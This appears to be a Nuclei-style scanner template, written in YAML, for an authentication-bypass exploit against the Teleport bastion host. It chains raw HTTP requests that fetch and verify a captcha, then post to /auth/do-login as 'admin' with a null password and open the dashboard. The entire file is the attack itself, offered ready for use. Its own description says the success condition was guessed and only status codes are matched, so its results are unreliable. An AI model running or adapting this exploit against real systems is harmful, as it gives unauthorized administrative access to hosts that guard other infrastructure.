id: poc-2f897829349c88af9d3a
info:
  name: Teleport堡垒机do-login任意用户登录漏洞
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: unauth,2025
http:
- raw:
  - 'GET /auth/captcha?h=36&rnd=0.39124018049760567 HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0

    Accept: image/avif,image/webp,*/*

    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

    Accept-Encoding: gzip, deflate

    Connection: close

    Cookie: _sid=tp_1700221267_fbf3ff64ee297b12'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
- raw:
  - 'POST /auth/verify-captcha HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0

    Accept: application/json, text/javascript, */*; q=0.01

    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

    Accept-Encoding: gzip, deflate

    Content-Type: application/x-www-form-urlencoded; charset=UTF-8

    X-Requested-With: XMLHttpRequest

    Content-Length: 37

    Connection: close

    Cookie: _sid=tp_1700221267_fbf3ff64ee297b12


    args={"captcha":"ckpa"}'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
- raw:
  - 'POST /auth/do-login HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0

    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

    Accept-Encoding: gzip, deflate

    Connection: close

    Cookie: _sid=tp_1700221267_fbf3ff64ee297b12

    Upgrade-Insecure-Requests: 1

    Content-Type: application/x-www-form-urlencoded

    Content-Length: 94


    args={"type":2,"username":"admin","password":null,"captcha":"ckpa","oath":"","remember":false}'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
- raw:
  - 'GET /dashboard HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0

    Accept: application/json, text/javascript, */*; q=0.01

    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

    Accept-Encoding: gzip, deflate

    X-Requested-With: XMLHttpRequest

    Connection: close

    Cookie: _sid=tp_1700221267_fbf3ff64ee297b12'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
